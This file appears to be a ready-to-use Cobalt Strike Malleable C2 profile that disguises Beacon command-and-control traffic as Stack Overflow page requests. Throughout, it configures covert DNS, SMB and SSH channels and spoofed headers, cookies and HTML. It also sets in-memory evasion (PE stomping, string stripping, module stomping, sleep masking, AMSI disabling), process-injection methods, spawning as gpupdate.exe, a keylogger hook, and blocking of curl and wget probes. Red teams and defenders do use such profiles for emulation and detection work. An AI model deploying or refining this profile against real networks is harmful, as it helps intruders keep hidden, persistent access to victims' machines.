#stackoverflow profile
#xx0hcd
#modify Host: headers to whatever.

set sleeptime "35000";
set jitter    "22";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

set data_jitter "50";

set sample_name "stackoverflow.profile";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {

    set uri "/questions/32251816/c-sharp-directives-compilation-error";
    
    client {

#        header "Host" "stackoverflow.com";
        header "Accept" "*/*";
	header "Accept-Language" "en-US";
#	header "Connection" "close";
	
        
        metadata {
            netbios;
	    prepend "prov=";
	    append ";notice-ctt=!1";
	    append ";_ga=GA1.2.9924";
	    append ";_gat=1";
	    append ";__qca=P0-214459";
	    	    
	    header "Cookie";

        }

    }

    server {

        header "Cache-control" "private";
	header "Content-Type" "text/html; charset=utf-8";
	header "X-Frame-Origins" "SAMEORIGIN";
	header "Age" "0";
	header "Via" "1.1 varnish";
	header "X-Cache" "MISS";
	header "Vary" "Accept-Encoding,Fastly-SSL";
        
        output {

            base64url;	    
	    prepend "\n";    
	    prepend "<link rel=\"shortcut icon\" href=\"https://cdn.sstatic.net/Sites/stackoverflow/img/favicon.ico?v=";
	    prepend "<title>c# 4.0 - C# Preprocessor Directives (#if and #endif) not working. Compilation error - Stack Overflow</title>";
	    prepend "<head>\n";
	    prepend "<html itemscope itemtype=\"http://schema.org/QAPage\" class=\"html__responsive\">\n";
	    prepend "<!DOCTYPE html>\n\n";
	    append "<h2 data-answercount=\"3\">
                                3 Answers
                                <span style=\"display:none;\" itemprop=\"answerCount\">3</span>
                        </h2>
                        <div>
                            
<div id=\"tabs\">
        <a href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=active#tab-top\" data-nav-xhref=\"\" title=\"Answers with the latest activity first\" data-value=\"active\" data-shortcut=\"A\">
            active</a>
        <a href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=oldest#tab-top\" data-nav-xhref=\"\" title=\"Answers in the order they were provided\" data-value=\"oldest\" data-shortcut=\"O\">
            oldest</a>
        <a class=\"youarehere is-selected \" href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=votes#tab-top\" data-nav-xhref=\"\" title=\"Answers with the highest score first\" data-value=\"votes\" data-shortcut=\"V\">
            votes</a>";

            print;
        }
    }
}

http-post {
    
    set uri "/questions/32251817/c-sharp-directives-compilation-error";
    set verb "GET";

    client {

#        header "Host" "stackoverflow.com";
        header "Accept" "*/*";
	header "Accept-Language" "en";
#	header "Connection" "close";     
        
        output {
            netbios;
	    prepend "prov=";
	    append ";notice-ctt=!1";
	    append ";_ga=GA1.2.9924";
	    append ";_gat=1";
	    append ";__qca=P0-214459";
	    	    
	    header "Cookie";


        }


        id {
	    base64url;
	    parameter "answertab";

        }
    }

    server {

        header "Cache-control" "private";
	header "Content-Type" "text/html; charset=utf-8";
	header "X-Frame-Origins" "SAMEORIGIN";
	header "Strict-Transport-Security" "max-age=15552000";
	header "Via" "1.1 varnish";
	header "Age" "0";
	header "Connection" "close";
	header "X-Cache" "MISS";
	header "X-Cache-Hits" "0";
	header "Vary" "Fastly-SSL";
        

        output {
            base64url;	    
	    prepend "\n";    
	    prepend "<link rel=\"shortcut icon\" href=\"https://cdn.sstatic.net/Sites/stackoverflow/img/favicon.ico?v=";
	    prepend "<title>c# 4.0 - C# Preprocessor Directives (#if and #endif) not working. Compilation error - Stack Overflow</title>";
	    prepend "<head>\n";
	    prepend "<html itemscope itemtype=\"http://schema.org/QAPage\" class=\"html__responsive\">\n";
	    prepend "<!DOCTYPE html>\n\n";
	    append "<h2 data-answercount=\"3\">
                                3 Answers
                                <span style=\"display:none;\" itemprop=\"answerCount\">3</span>
                        </h2>
                        <div>
                            
<div id=\"tabs\">
        <a href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=active#tab-top\" data-nav-xhref=\"\" title=\"Answers with the latest activity first\" data-value=\"active\" data-shortcut=\"A\">
            active</a>
        <a href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=oldest#tab-top\" data-nav-xhref=\"\" title=\"Answers in the order they were provided\" data-value=\"oldest\" data-shortcut=\"O\">
            oldest</a>
        <a class=\"youarehere is-selected \" href=\"/questions/32251816/c-sharp-preprocessor-directives-if-and-endif-not-working-compilation-error?answertab=votes#tab-top\" data-nav-xhref=\"\" title=\"Answers with the highest score first\" data-value=\"votes\" data-shortcut=\"V\">
            votes</a>";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/posts/32251817/ivc/7600";
    set uri_x64 "/posts/32251816/ivc/7600";

    client {
#	header "Host" "stackoverflow.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "X-Requested-With" "XMLHTTPRequest";
	header "Connection" "close";
    }

    server {
	header "Cache-control" "no-cache, no-store, must-revalidate";
	header "Content-Type" "text/plain";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Via" "1.1 varnish";
	header "Vary" "Fastly-SSL";
    
    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
